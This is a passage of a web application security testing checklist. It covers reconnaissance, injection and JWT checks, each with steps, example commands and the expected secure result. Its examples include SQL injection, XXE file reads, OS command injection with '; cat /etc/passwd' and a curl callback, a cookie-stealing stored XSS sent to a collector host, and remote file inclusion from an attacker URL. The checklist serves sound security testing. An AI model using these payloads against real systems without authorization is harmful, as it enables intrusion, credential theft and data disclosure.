  *Expected:* Responses do not show detailed versions or component names in Server, X-Powered-By, error pages or meta tags. Default error pages are replaced.  
  *Refs:* wstg: WSTG-INFO-02, WSTG-INFO-08, WSTG-INFO-09; asvs: V13.4.6; cwe: CWE-497, CWE-200; capec: CAPEC-224, CAPEC-169

- [ ] **WEB-INFO-003** Review robots.txt, sitemap.xml, security.txt and other metafiles for leakage  
  *Severity if fail:* Low | *Type:* Manual, Automated  
  *Objective:* Find hidden paths or internal data that webserver metafiles reveal.  
  *Steps:*
  1. Download robots.txt, sitemap.xml, humans.txt and the .well-known directory files with curl.
  2. List each Disallow path and request it without credentials.
  3. Compare robots.txt with the robots META tags in the page source.
  4. Look in the files for admin paths, internal host names, staging URLs and e-mail addresses.
  5. Make sure no Disallow rule is the only control that protects a sensitive path.
  *Example:* `for f in robots.txt sitemap.xml humans.txt .well-known/security.txt; do curl -si https://example.com/$f | head -40; done`  
  *Expected:* Metafiles list no sensitive paths or internal data. Every listed sensitive path has its own access control.  
  *Refs:* wstg: WSTG-INFO-03; cwe: CWE-200; capec: CAPEC-116

- [ ] **WEB-INFO-004** Enumerate hosts, subdomains, ports and virtual hosts of the application  
  *Severity if fail:* Low | *Type:* Manual, Automated  
  *Objective:* Find web applications, hosts and services outside the known scope that increase the attack surface.  
  *Steps:*
  1. Collect subdomains with subfinder or amass in passive mode and from Certificate Transparency logs on crt.sh.
  2. Resolve the names with dnsx and probe live hosts with httpx.
  3. Scan all TCP ports of the in-scope IP addresses with Nmap service detection.
  4. Request each IP address with the different Host header names found.
  5. Try a DNS zone transfer against each name server.
  6. Compare the result with the owner asset list and report unknown hosts and ports.
  *Example:* `subfinder -d example.com -silent | dnsx -silent | httpx -title -tech-detect; nmap -Pn -sT -sV -p- 192.0.2.10; dig axfr example.com @ns1.example.com`  
  *Expected:* All found hosts, ports and virtual hosts are in the asset list and need to be exposed. The name servers refuse zone transfers.  
  *Refs:* wstg: WSTG-INFO-04; owasp_top10: A02:2025; cheatsheet: Attack_Surface_Analysis_Cheat_Sheet; cwe: CWE-200; capec: CAPEC-169

- [ ] **WEB-INFO-005** Review page content, JavaScript, source maps and generated files for leakage  
  *Severity if fail:* Medium | *Type:* Manual, Automated | *Level:* ASVS L3  
  *Objective:* Find comments, secrets, internal routes, source maps and file metadata that leak information to the client.  
  *Steps:*
  1. Read HTML comments and meta tags in the page source of each main page.
  2. Download all JavaScript files and search them for keys, tokens, internal URLs and admin routes.
  3. Request each JavaScript file with the .map extension added.
  4. Look at the body of 3xx and 401 responses for content.
  5. Download generated PDF and Office files and read the Producer and Creator metadata.
  6. Check API keys found in the code for restrictions by referrer, IP or API.
  *Example:* `curl -s https://example.com/app.js | grep -iE 'api[_-]?key|secret|token|/admin'; curl -sI https://example.com/app.js.map; exiftool report.pdf | grep -iE 'producer|creator'; trufflehog filesystem ./downloaded-js`  
  *Expected:* Pages, scripts and files hold no secrets, internal data, comments with sensitive text or version details. Source maps are not public.  
  *Refs:* wstg: WSTG-INFO-05; asvs: V13.4.6; cwe: CWE-540, CWE-200, CWE-615; capec: CAPEC-37

- [ ] **WEB-INFO-006** Map application entry points and request parameters  
  *Severity if fail:* Info | *Type:* Manual  
  *Objective:* Find all parameters, headers, cookies and hidden fields that the application accepts, as input for later tests.  
  *Steps:*
  1. Walk through the application with an intercepting proxy such as ZAP or Burp Suite.
  2. Record each GET and POST request with its query, body, cookie and header parameters.
  3. Mark hidden fields and custom headers such as debug flags.
  4. Record each Set-Cookie header, redirect, 403 and 500 response.
  5. Compare the list with the source-code endpoint list if source is available.
  *Example:* `zap-baseline.py -t https://example.com -r zap.html; noir scan ./src -f curl`  
  *Expected:* The tester has a complete list of entry points. No undocumented or debug parameters exist.  
  *Refs:* wstg: WSTG-INFO-06; cheatsheet: Attack_Surface_Analysis_Cheat_Sheet

- [ ] **WEB-INFO-007** Map execution paths and workflows with a crawler  
  *Severity if fail:* Info | *Type:* Manual, Automated  
  *Objective:* Find application areas and workflows that the tester must cover, including routes that a simple crawler misses.  
  *Steps:*
  1. Run the ZAP spider and the AJAX spider against the application with a valid session.
  2. Write down the main workflows and the decision points in each.
  3. Use a headless browser crawler for client-side routes.
  4. Compare the crawled URLs with the entry-point list.
  *Example:* `zap-baseline.py -t https://example.com -j; katana -u https://example.com -jc -d 3`  
  *Expected:* The tester has a documented map of paths and workflows with coverage notes.  
  *Refs:* wstg: WSTG-INFO-07

- [ ] **WEB-INFO-008** Map the application architecture and the intermediate components  
  *Severity if fail:* Info | *Type:* Manual | *Level:* ASVS L2  
  *Objective:* Find proxies, CDNs, load balancers, WAFs, third-party services and storage that make up the architecture.  
  *Steps:*
  1. Look for proxy and CDN markers: duplicate Server headers, WHOIS owner of the IP, load balancer cookies.
  2. List external hosts the browser calls in the developer tools Network tab.
  3. Look for storage host names such as s3.amazonaws.com and blob.core.windows.net.
  4. Send a known attack string and look for WAF block pages.
  5. Try to reach the origin server directly, without the CDN or WAF.
  6. Write the architecture diagram and compare it with the design documents.
  *Example:* `curl -sI https://example.com | grep -iE 'via|cf-ray|x-cache|set-cookie'; whois $(dig +short example.com | head -1); wafw00f https://example.com`  
  *Expected:* The architecture matches the documents. The origin server cannot be reached around the CDN or WAF.  
  *Refs:* wstg: WSTG-INFO-10; cheatsheet: Attack_Surface_Analysis_Cheat_Sheet; asvs: V13.1.1


## INJ

- [ ] **WEB-INJ-001** Test for SQL injection in database queries  
  *Severity if fail:* Critical | *Type:* Manual | *Level:* ASVS L1  
  *Objective:* Finds inputs where user data changes the structure of a SQL query.  
  *Steps:*
  1. List every input that can reach a database query, including hidden fields, headers and cookies.
  2. Send a single quote and a semicolon in each input and compare the responses.
  3. Send a true clause and a false clause, for example 1=1 and 1=2, and compare the responses.
  4. Send a time delay payload and measure the response time.
  5. Run sqlmap against the confirmed input to find the database type and the level of access.
  *Example:* `Burp Repeater payloads: 1' OR '1'='1 ; 1' AND '1'='2 ; 1 AND IF(version() like '5%',sleep(5),'false')-- ; sqlmap -u "https://target/product.php?id=1" --technique=BEUST --risk=3`  
  *Expected:* Only parameterized queries, ORM calls, or an allowlisted structure reach the database. No SQL error or timing difference exposes injection.  
  *Refs:* owasp_top10: A05:2025; wstg: WSTG-INJT-05; asvs: V1.2.4; cheatsheet: SQL_Injection_Prevention_Cheat_Sheet, Query_Parameterization_Cheat_Sheet; cwe: CWE-89; capec: CAPEC-66, CAPEC-7, CAPEC-108

- [ ] **WEB-INJ-002** Test SQL injection against each supported database backend  
  *Severity if fail:* High | *Type:* Manual  
  *Objective:* Confirms the database-specific fingerprint and injection syntax match what the server runs.  
  *Steps:*
  1. Fingerprint the backend from error text, comment syntax and version functions.
  2. Use the UNION technique to find the column count with an ORDER BY payload.
  3. Extract the database version with a UNION SELECT of the version function.
  4. Repeat the fingerprint and extraction steps for Oracle, MySQL, SQL Server, PostgreSQL and MS Access syntax.
  *Example:* `https://target/product.php?id=10 ORDER BY 10-- ; https://target/product.php?id=10 UNION SELECT 1,@@version-- (MSSQL); UNION ALL SELECT NULL,version(),NULL LIMIT 1 OFFSET 1-- (PostgreSQL); 1 AND 1=0 UNION SELECT @@version/* (MySQL)`  
  *Expected:* The application returns the same generic error for every backend and never discloses database version or structure.  
  *Refs:* wstg: WSTG-INJT-05; cheatsheet: SQL_Injection_Prevention_Cheat_Sheet; cwe: CWE-89; capec: CAPEC-66

- [ ] **WEB-INJ-003** Test NoSQL query operators for injection  
  *Severity if fail:* Critical | *Type:* Manual  
  *Objective:* Finds unsafe handling of JSON or operator-based query input in NoSQL databases.  
  *Steps:*
  1. Find endpoints that pass JSON bodies into a NoSQL query, such as MongoDB find or aggregate.
  2. Replace a string value with an operator object, for example {"$ne": null} or {"$gt": ""}.
  3. Send special characters '"\;{} in a single text field and compare the responses.
  4. If a $where clause exists, inject JavaScript and measure execution with a delay.
  *Example:* `POST body: {"username": {"$ne": null}, "password": {"$ne": null}} ; $where injection: 0;var date=new Date();do{curDate=new Date();}while(curDate-date<10000)`  
  *Expected:* The application rejects operator objects in place of scalar values and does not evaluate attacker JavaScript.  
  *Refs:* wstg: WSTG-INJT-05; cheatsheet: NoSQL_Security_Cheat_Sheet, SQL_Injection_Prevention_Cheat_Sheet; cwe: CWE-943; capec: CAPEC-676

- [ ] **WEB-INJ-004** Test ORM and query-builder calls for injection  
  *Severity if fail:* High | *Type:* Code Review  
  *Objective:* Finds ORM code that concatenates input instead of using bound parameters.  
  *Steps:*
  1. Identify the ORM in use from error messages, headers or source code.
  2. Send a single quote in a field that reaches an ORM query and look for an ORM-specific error.
  3. For Hibernate, send an HQL payload that always evaluates true.
  4. Review source code for createQuery or createSQLQuery calls built by string concatenation.
  *Example:* `HQL: ' OR '1' = '1' -- ; Laravel example payload from advisory: whereRaw with unescaped input; review code for session.createQuery("from Orders where id=" + id)`  
  *Expected:* All ORM queries use bound parameters or the query builder, never string concatenation of user input.  
  *Refs:* wstg: WSTG-INJT-05; cheatsheet: SQL_Injection_Prevention_Cheat_Sheet, Query_Parameterization_Cheat_Sheet; cwe: CWE-564, CWE-89; capec: CAPEC-109

- [ ] **WEB-INJ-005** Test SQL injection inside stored procedures and functions  
  *Severity if fail:* Critical | *Type:* Manual  
  *Objective:* Finds stored procedures that build dynamic SQL from parameters with EXECUTE IMMEDIATE or exec.  
  *Steps:*
  1. Identify calls to stored procedures from the application traffic.
  2. Send injection payloads in each procedure parameter.
  3. Check if the procedure calls EXECUTE IMMEDIATE, exec, or sp_executesql with concatenated input.
  4. Review the procedure source if code access is available.
  *Example:* `SQL Server: exec master.dbo.xp_cmdshell 'whoami'-- ; a procedure parameter of 1' OR 1=1--`  
  *Expected:* Stored procedures use bind variables for every parameter and never concatenate input into dynamic SQL.  
  *Refs:* owasp_top10: A05:2025; wstg: WSTG-INJT-05; cheatsheet: SQL_Injection_Prevention_Cheat_Sheet; cwe: CWE-89; capec: CAPEC-108

- [ ] **WEB-INJ-006** Test LDAP search filters and login for injection  
  *Severity if fail:* Critical | *Type:* Manual | *Level:* ASVS L2  
  *Objective:* Finds LDAP filters built by concatenating user input into the filter string.  
  *Steps:*
  1. Find inputs used to build an LDAP search filter, such as a username or search box.
  2. Send a wildcard character and LDAP metacharacters and compare the responses.
  3. Try an authentication bypass with a filter-closing payload in the username and password fields.
  *Example:* `Search: user=* ; Login bypass: user=*)(uid=*))(|(uid=* , pass=password`  
  *Expected:* The application escapes LDAP metacharacters in every filter and rejects an always-true filter.  
  *Refs:* owasp_top10: A05:2025; wstg: WSTG-INJT-06; asvs: V1.2.6; cheatsheet: LDAP_Injection_Prevention_Cheat_Sheet; cwe: CWE-90; capec: CAPEC-136

- [ ] **WEB-INJ-007** Test XML input for XML injection and malformed structure attacks  
  *Severity if fail:* Medium | *Type:* Manual | *Level:* ASVS L2  
  *Objective:* Finds XML parsers that fail to neutralize metacharacters supplied in element values.  
  *Steps:*
  1. Find an endpoint or form that accepts data later placed into an XML document.
  2. Submit single and double quotes inside an XML attribute value.
  3. Submit angle brackets, a CDATA closing sequence and an unescaped ampersand inside an element value.
  4. Check if the resulting document is malformed or if content is misplaced.
  *Example:* `Username = foo' ; Username = foo<!-- ; CDATA breakout: ]]> ; unescaped ampersand: Username = &foo`  
  *Expected:* The application escapes or rejects XML metacharacters and the document structure cannot be changed by input.  
  *Refs:* wstg: WSTG-INJT-07; asvs: V1.1.2; cwe: CWE-91; capec: CAPEC-250

- [ ] **WEB-INJ-008** Test XML parser configuration for XXE and billion-laughs attacks  
  *Severity if fail:* Critical | *Type:* Manual | *Level:* ASVS L1  
  *Objective:* Finds XML parsers that resolve external entities or expand nested entities without limits.  
  *Steps:*
  1. Submit an XML document with a DOCTYPE that defines an external entity pointing to a local file.
  2. Observe whether the response discloses the file content.
  3. If no direct output exists, use an out-of-band DOCTYPE pointing to a collector host and watch for a callback.
  4. Submit a nested entity expansion payload and monitor server memory and CPU.
  *Example:* `<!DOCTYPE user [ <!ENTITY xxe SYSTEM "file:///etc/passwd" >]><user>&xxe;</user> ; OOB: <!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://collaborator-host/collect">%xxe;]> ; billion laughs nested <!ENTITY> chain`  
  *Expected:* The parser disables DOCTYPE declarations and external entity resolution and limits entity expansion.  
  *Refs:* wstg: WSTG-INJT-07; asvs: V1.5.1; cheatsheet: XML_External_Entity_Prevention_Cheat_Sheet; cwe: CWE-611, CWE-776; capec: CAPEC-228, CAPEC-197

- [ ] **WEB-INJ-009** Test server-side includes for SSI injection  
  *Severity if fail:* Critical | *Type:* Manual  
  *Objective:* Finds pages that interpret user input as a server-side include directive.  
  *Steps:*
  1. Determine whether the web server supports SSI, for example .shtml pages.
  2. Find inputs including headers and cookies that are reflected into SSI-processed pages.
  3. Submit an echo directive to read a server variable.
  4. Submit an exec directive to request operating system command output.
  *Example:* `Referer: <!--#exec cmd="/bin/ps ax"--> ; <!--#echo var="DOCUMENT_NAME" -->`  
  *Expected:* SSI directives in user input are neutralized and the exec directive is disabled on the server.  
  *Refs:* wstg: WSTG-INJT-08; cwe: CWE-97; capec: CAPEC-101

- [ ] **WEB-INJ-010** Test XPath queries for injection and authentication bypass  
  *Severity if fail:* Critical | *Type:* Manual | *Level:* ASVS L2  
  *Objective:* Finds XPath queries built by concatenating untrusted login or search input.  
  *Steps:*
  1. Find an input placed into an XPath expression, such as a login form backed by an XML store.
  2. Submit an always-true boolean payload in the username and password fields.
  3. Observe whether the application authenticates or returns data without valid credentials.
  *Example:* `Username: ' or '1' = '1 ; Password: ' or '1' = '1`  
  *Expected:* The application binds values to the XPath query instead of concatenating them and rejects the always-true payload.  
  *Refs:* owasp_top10: A05:2025; wstg: WSTG-INJT-09; asvs: V1.2.7; cheatsheet: XPath_Injection_Prevention_Cheat_Sheet; cwe: CWE-643

- [ ] **WEB-INJ-011** Test webmail parameters for IMAP or SMTP command injection  
  *Severity if fail:* High | *Type:* Manual | *Level:* ASVS L2  
  *Objective:* Finds webmail front ends that pass unescaped input into IMAP or SMTP commands.  
  *Steps:*
  1. Identify parameters used to build IMAP or SMTP commands, such as mailbox or message ID.
  2. Submit a double quote and other special characters in the parameter.
  3. Submit a CRLF sequence followed by a second command to test command injection.
  *Example:* `https://webmail/src/view_header.php?mailbox=INBOX%22&passed_id=1 ; message_id=1 BODY[HEADER]%0d%0aV100 CAPABILITY%0d%0a`  
  *Expected:* IMAP and SMTP special characters and CRLF sequences are rejected or escaped before use in a mail command.  
  *Refs:* wstg: WSTG-INJT-10; asvs: V1.3.11; cwe: CWE-93; capec: CAPEC-41

- [ ] **WEB-INJ-012** Test for code injection through dynamic code evaluation  
  *Severity if fail:* Critical | *Type:* Manual | *Level:* ASVS L1  
  *Objective:* Finds features that execute user-supplied code through eval or an include statement.  
  *Steps:*
  1. Find inputs that are used in an include, require, eval or similar execution construct.
  2. Submit a benign code snippet and check for its effect in the response.
  3. If execution is confirmed, submit a safe command to show code execution.
  *Example:* `ASP code injection input: Request("Data") written to data.txt then Server.Execute("data.txt"); PHP eval probe: 7*7 to confirm execution, then a benign system command`  
  *Expected:* User input never reaches eval, include or an equivalent dynamic execution function.  
  *Refs:* owasp_top10: A05:2025; wstg: WSTG-INJT-11; asvs: V1.3.2; cwe: CWE-94, CWE-95; capec: CAPEC-242

- [ ] **WEB-INJ-013** Test file inclusion parameters for local and remote file inclusion  
  *Severity if fail:* Critical | *Type:* Manual | *Level:* ASVS L1  
  *Objective:* Finds include or require calls that build a path from user input without validation.  
  *Steps:*
  1. Find a parameter that selects a file to include or preview.
  2. Submit a path traversal sequence to read a local file outside the intended directory.
  3. Append a null byte or known truncation technique if an extension is appended server-side.
  4. If outbound connections are allowed, submit a URL to test remote file inclusion.
  5. Test PHP wrapper payloads such as php://filter and data:// if the backend is PHP.
  *Example:* `https://target/preview.php?file=../../../../etc/passwd ; php://filter/convert.base64-encode/resource=config.php ; https://target/vuln.php?file=https://attacker/malicious`  
  *Expected:* File and URL parameters are resolved against an allowlist of safe paths with no path traversal or remote URL.  
  *Refs:* wstg: WSTG-INJT-11; asvs: V5.3.2; cheatsheet: File_Upload_Cheat_Sheet; cwe: CWE-98, CWE-73, CWE-22; capec: CAPEC-193, CAPEC-126  
  *See:* WEB-AUTHZ-015

- [ ] **WEB-INJ-014** Test operating system command injection in server functions  
  *Severity if fail:* Critical | *Type:* Manual | *Level:* ASVS L1  
  *Objective:* Finds application features that pass untrusted input into an OS command without sanitization.  
  *Steps:*
  1. Find features that call the operating system, such as file conversion, ping or diagnostic tools.
  2. Append a command separator and a benign command to the input.
  3. Try alternative separators and command substitution if the first payload is filtered.
  4. If no output is returned, use an out-of-band callback to show blind execution.
  *Example:* `Doc=Doc1.pdf | Dir c:\ ; input|/bin/ls ; ;cat /etc/passwd ; $(whoami) ; `whoami` ; OOB: ; curl http://collaborator-host`  
  *Expected:* The application avoids calling OS commands with user input, or uses parameterized execution APIs with an allowlist of commands and arguments.  
  *Refs:* owasp_top10: A05:2025; wstg: WSTG-INJT-12; asvs: V1.2.5; cheatsheet: OS_Command_Injection_Defense_Cheat_Sheet; cwe: CWE-77, CWE-78; capec: CAPEC-88, CAPEC-6, CAPEC-15

- [ ] **WEB-INJ-015** Test string formatting functions for format string injection  
  *Severity if fail:* High | *Type:* Manual | *Level:* ASVS L2  
  *Objective:* Finds code that passes user input directly as the format argument of a printf-family function.  
  *Steps:*
  1. Find inputs that may reach a format function, for example logging of a username.
  2. Submit conversion specifiers such as %s and %n in the input.
  3. Observe for an application error, crash, or information disclosure in the response.
  *Example:* `https://target/userinfo?username=%25s%25s%25s%25n`  
  *Expected:* User input is never passed as the format argument of a format function; it is passed only as a data argument.  
  *Refs:* wstg: WSTG-INJT-13; asvs: V1.3.10; cwe: CWE-134; capec: CAPEC-135

- [ ] **WEB-INJ-016** Test for incubated vulnerabilities that need a recall step  
  *Severity if fail:* High | *Type:* Manual  
  *Objective:* Finds stored injection that only triggers when a later action recalls the planted data.  
  *Steps:*
  1. Identify features that store attacker data for later use, such as uploads, forum posts or report generation.
  2. Plant a stored XSS or SQL payload that fires on a later recall, such as an admin viewing a report.
  3. Trigger or wait for the recall step and confirm the planted payload executes.
  *Example:* `Bulletin post: <script>document.write('<img src="https://collaborator-host/cv.jpg?'+document.cookie+'">')</script> then wait for an admin to view the post`  
  *Expected:* Stored input is sanitized at write time and encoded at every later recall point, so the planted payload never executes.  
  *Refs:* wstg: WSTG-INJT-14; cwe: CWE-79; capec: CAPEC-592

- [ ] **WEB-INJ-017** Test reflected response headers for HTTP response splitting  
  *Severity if fail:* High | *Type:* Manual  
  *Objective:* Finds user input reflected into a response header without CRLF filtering.  
  *Steps:*
  1. Find a parameter reflected into a Location or Set-Cookie header, often through a redirect.
  2. Submit a CRLF sequence followed by a forged header and body in the parameter.
  3. Check if the response is split into two messages by an intermediary cache or browser.
  *Example:* `interface=advanced%0d%0aContent-Length:%200%0d%0a%0d%0aHTTP/1.1%20200%20OK%0d%0aContent-Type:%20text/html%0d%0a%0d%0a<html>injected</html>`  
  *Expected:* CR and LF characters are stripped or rejected before user input is placed into any response header.  
  *Refs:* wstg: WSTG-INJT-15; cwe: CWE-93, CWE-113; capec: CAPEC-34

- [ ] **WEB-INJ-018** Test front-end and back-end servers for HTTP request smuggling  
  *Severity if fail:* Critical | *Type:* Manual  
  *Objective:* Finds parsing mismatches between Content-Length and Transfer-Encoding across proxy layers.  
  *Steps:*
  1. Send a CL.TE probe request with conflicting Content-Length and chunked Transfer-Encoding.
  2. Send a TE.CL probe request with the chunk size mismatched to the Content-Length.
  3. Send an obfuscated Transfer-Encoding header to test TE.TE desynchronization.
  4. Observe whether a following legitimate request is corrupted or routed unexpectedly.
  *Example:* `CL.TE: Content-Length: 35\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\nGET /404 HTTP/1.1\r\nFoo: x ; Burp Suite HTTP Request Smuggler extension`  
  *Expected:* The front-end and back-end agree on request boundaries and no smuggled request is ever processed.  
  *Refs:* wstg: WSTG-INJT-16; cwe: CWE-444; capec: CAPEC-33, CAPEC-105, CAPEC-273  
  *See:* WEB-HTTP-004

- [ ] **WEB-INJ-019** Test Host header handling for injection and cache poisoning  
  *Severity if fail:* High | *Type:* Manual | *Level:* ASVS L1  
  *Objective:* Finds server logic that trusts the Host or X-Forwarded-Host header for routing or link generation.  
  *Steps:*
  1. Send a request with the Host header set to an attacker domain and observe the response.
  2. If filtered, retry using the X-Forwarded-Host header.
  3. Trigger password reset functionality with a tampered Host header and check the link in the email.
  4. Send a poisoned Host header to a cacheable page and request the same page again from another session.
  *Example:* `Host: www.attacker.com ; X-Forwarded-Host: www.attacker.com ; password reset request with Host: www.attacker.com`  
  *Expected:* The server uses a fixed, server-side configured hostname and ignores the Host header value for links and cache keys.  
  *Refs:* wstg: WSTG-INJT-17; asvs: V3.4.2; cwe: CWE-20; capec: CAPEC-141

- [ ] **WEB-INJ-020** Test template rendering for server-side template injection  
  *Severity if fail:* Critical | *Type:* Manual | *Level:* ASVS L2  
  *Objective:* Finds templating engines that evaluate expressions built from untrusted input.  
  *Steps:*
  1. Find inputs rendered through a template engine, such as a greeting or report field.
  2. Submit a generic arithmetic probe such as {{7*7}} and check if it is evaluated.
  3. Identify the template engine from the response and research its built-in functions.
  4. Build a proof-of-concept remote code execution payload for the identified engine.
  *Example:* `Probe: a{{7*7}}b or ${7*7} or <%= 7*7 %> ; Flask/Jinja2: curl -g 'https://target/page?name={{7*7}}' returns Hello 49`  
  *Expected:* Untrusted input is never concatenated into template source; it is passed only as template data with escaping enabled.  
  *Refs:* owasp_top10: A05:2025; wstg: WSTG-INJT-18; asvs: V1.3.7; cheatsheet: Server_Side_Template_Injection_Prevention_Cheat_Sheet; cwe: CWE-1336, CWE-94; capec: CAPEC-242

- [ ] **WEB-INJ-021** Test server-initiated requests for SSRF  
  *Severity if fail:* Critical | *Type:* Manual | *Level:* ASVS L2  
  *Objective:* Finds server functions that fetch a URL supplied by the client without restriction.  
  *Steps:*
  1. Find a feature that fetches a URL on the server, such as a webhook, PDF generator or import tool.
  2. Submit a URL pointing to the loopback address or an internal hostname.
  3. Submit alternative IP encodings if plain loopback addresses are blocked.
  4. Submit a file:// URL to test for local file disclosure.
  *Example:* `http://127.0.0.1/admin ; http://2130706433/ ; http://017700000001/ ; http://127.0.0.2/ ; file:///etc/passwd ; iframe src=file:///etc/passwd in PDF generator input`  
  *Expected:* Outbound requests are restricted to an allowlist of domains, ports and protocols and loopback and link-local addresses are blocked.  
  *Refs:* owasp_top10: A05:2025; wstg: WSTG-INJT-19; asvs: V1.3.6; cheatsheet: Server_Side_Request_Forgery_Prevention_Cheat_Sheet; cwe: CWE-918; capec: CAPEC-664

- [ ] **WEB-INJ-022** Test object binding endpoints for mass assignment  
  *Severity if fail:* High | *Type:* Manual  
  *Objective:* Finds auto-binding frameworks that let a client set fields never exposed in the form.  
  *Steps:*
  1. Identify endpoints that create or update an object from submitted parameters.
  2. Retrieve the full object representation to learn hidden or sensitive field names.
  3. Add a sensitive field such as isAdmin or role to the create or update request.
  4. Observe whether the sensitive field value is accepted and persisted.
  *Example:* `POST /createUser username=bob&password=x&email=bob@test&isAdmin=true ; probe field user[nonexistingattribute] for autobinding behavior`  
  *Expected:* The backend binds only an explicit allowlist of fields; extra client-supplied fields are ignored.  
  *Refs:* wstg: WSTG-INJT-20; cheatsheet: Mass_Assignment_Cheat_Sheet; cwe: CWE-915  
  *See:* WEB-AUTHZ-007

- [ ] **WEB-INJ-023** Test spreadsheet export for CSV and formula injection  
  *Severity if fail:* Medium | *Type:* Manual | *Level:* ASVS L3  
  *Objective:* Finds exported CSV files where a cell beginning with a formula character is evaluated by spreadsheet software.  
  *Steps:*
  1. Identify export features that place untrusted input into CSV, such as reports or audit logs.
  2. Enter a value beginning with =, +, -, @, tab or carriage return in an exportable field.
  3. Export the file and open it in Excel and in LibreOffice.
  4. Save and reopen the file in Excel to check the mitigation survives a round trip.
  *Example:* `=1+1 ; +1+1 ; @SUM(1,1) ; =HYPERLINK("http://example.invalid/leak?test=1","Click Me") ; separator breakout then =1+1`  
  *Expected:* No exported cell is interpreted as a formula in Excel or LibreOffice, including after an Excel save and reopen.  
  *Refs:* wstg: WSTG-INJT-21; asvs: V1.2.10; cwe: CWE-1236

- [ ] **WEB-INJ-024** Test JSON-accepting endpoints for prototype pollution  
  *Severity if fail:* High | *Type:* Manual  
  *Objective:* Finds recursive merge or clone code that lets attacker keys modify Object.prototype.  
  *Steps:*
  1. Find JSON endpoints that merge, clone or extend a user-supplied object into application state.
  2. Submit a body containing a __proto__ or constructor.prototype key with a marker value.
  3. For client-side code, submit the marker through the URL hash or query string.
  4. Check whether the marker value is now present on a brand-new object.
  *Example:* `{"name":"test","__proto__":{"polluted":"yes"}} ; URL probe: https://target/#__proto__[testpolluted]=reflected ; then evaluate ({}).testpolluted in the console`  
  *Expected:* Merge and clone functions reject or strip __proto__, constructor and prototype keys before assignment.  
  *Refs:* wstg: WSTG-INJT-22; cheatsheet: Prototype_Pollution_Prevention_Cheat_Sheet; cwe: CWE-1321

- [ ] **WEB-INJ-025** Test cookies and API inputs for insecure deserialization  
  *Severity if fail:* Critical | *Type:* Manual | *Level:* ASVS L2  
  *Objective:* Finds entry points that deserialize untrusted Java, PHP, Python pickle, Node or .NET serialized objects.  
  *Steps:*
  1. Inspect cookies, hidden fields and API bodies for serialization markers such as rO0, O:4:, or a .NET binary header.
  2. Identify the serialization format and library version in use.
  3. Submit a non-destructive out-of-band probe, such as ysoserial URLDNS, to confirm deserialization.
  4. If a type-metadata field such as @class or @type is accepted, flag it as high priority.
  *Example:* `Cookie rememberMe=rO0ABXNy... ; java -jar ysoserial.jar URLDNS http://collaborator-host/ ; JSON probe {"@class":"com.example.Exploit"}`  
  *Expected:* The application never deserializes untrusted data, or restricts it to an allowlist of safe types with integrity checking.  
  *Refs:* owasp_top10: A05:2025; wstg: WSTG-INJT-23; asvs: V1.5.2; cheatsheet: Deserialization_Cheat_Sheet; cwe: CWE-502; capec: CAPEC-586  
  *See:* WEB-DESER-001


## JWT

- [ ] **WEB-JWT-001** Check that the token signature is validated  
  *Severity if fail:* Critical | *Type:* Automated | *Level:* ASVS L1  
  *Objective:* Finds services that accept tokens with a wrong or missing signature.  
  *Steps:*
  1. Decode a valid token and change one claim.
  2. Send the changed token with the old signature.
  3. Send a token with the signature removed.
  4. Send a token signed with a different key.
  *Example:* `jwt_tool <JWT> -M pb -t https://target/api/me -rh 'Authorization: Bearer JWT' (playbook scan of signature checks)`  
  *Expected:* The service rejects every token with an invalid or missing signature.  
  *Refs:* owasp_top10: A01:2025, A07:2025; wstg: WSTG-SESS-10; asvs: V9.1.1; cheatsheet: JSON_Web_Token_Cheat_Sheet; cwe: CWE-347, CWE-345; capec: CAPEC-633

- [ ] **WEB-JWT-002** Check the algorithm allowlist and the none algorithm  
  *Severity if fail:* Critical | *Type:* Automated | *Level:* ASVS L1  
  *Objective:* Finds acceptance of unsigned tokens or algorithms the service did not choose.  
  *Steps:*
  1. Read the code or configuration for the list of allowed algorithms.
  2. Send a token with alg set to none, in several letter cases.
  3. Send a token with an algorithm that is not on the list.
  4. Make sure the list holds either symmetric or asymmetric algorithms.
  *Example:* `jwt_tool <JWT> -X a -t https://target/api/me -rh 'Authorization: Bearer JWT'`  
  *Expected:* Only allowed algorithms are used for each context. The none algorithm is never accepted.  
  *Refs:* owasp_top10: A01:2025, A07:2025; wstg: WSTG-SESS-10; asvs: V9.1.2; cheatsheet: JSON_Web_Token_Cheat_Sheet; cwe: CWE-347, CWE-327

- [ ] **WEB-JWT-003** Check for key type confusion between symmetric and asymmetric keys  
  *Severity if fail:* High | *Type:* Manual | *Level:* ASVS L1  
  *Objective:* Finds services that accept a token made with the public key as a shared secret.  
  *Steps:*
  1. Find out if the service expects an RS or ES algorithm.
  2. Read the code: make sure the key type is bound to one algorithm.
  3. Send a token with an HS algorithm in a test environment.
  4. Look at the library version and known issues.
  *Example:* `jwt_tool <JWT> -X k -pk public.pem -t https://target/api/me -rh 'Authorization: Bearer JWT'`  
  *Expected:* The service binds each key to one algorithm. A token with a different key type is rejected.  
  *Refs:* owasp_top10: A07:2025; wstg: WSTG-SESS-10; asvs: V9.1.2; cheatsheet: JSON_Web_Token_Cheat_Sheet; cwe: CWE-347, CWE-327

- [ ] **WEB-JWT-004** Check that key material comes only from trusted sources  
  *Severity if fail:* Critical | *Type:* Code Review | *Level:* ASVS L1  
  *Objective:* Finds services that take the verification key from header values that the sender controls.  
  *Steps:*
  1. Read the code that selects the key.
  2. Make sure the jwk, jku and x5u headers are ignored or checked against an allowlist.
  3. Make sure the kid value is validated before any file or database lookup.
  4. Send a token with a changed header value in a test environment and look at the result.
  *Example:* `jwt_tool <JWT> -X s (spoofed JWKS) against a test instance; grep -rn 'jku\|x5u\|getKey\|kid' src/`  
  *Expected:* Keys come from pre-configured sources of the issuer. Header values cannot add new key sources.  
  *Refs:* owasp_top10: A01:2025, A07:2025; wstg: WSTG-SESS-10; asvs: V9.1.3; cheatsheet: JSON_Web_Token_Cheat_Sheet; cwe: CWE-347, CWE-345

- [ ] **WEB-JWT-005** Check the expiry and not-before claims  
  *Severity if fail:* Medium | *Type:* Manual | *Level:* ASVS L1  
  *Objective:* Finds tokens that are accepted outside their validity time.  
  *Steps:*
  1. Read the exp and nbf claims of a token.
  2. Send the token after exp.
  3. Send a token with nbf in the future.
  4. Check the lifetime: it must fit the application.
  *Example:* `jwt_tool <JWT> -T to edit exp; or wait for expiry and call curl -H 'Authorization: Bearer <JWT>' https://target/api/me`  
  *Expected:* Expired tokens and tokens that are not yet valid are rejected. Token lifetime is short.  
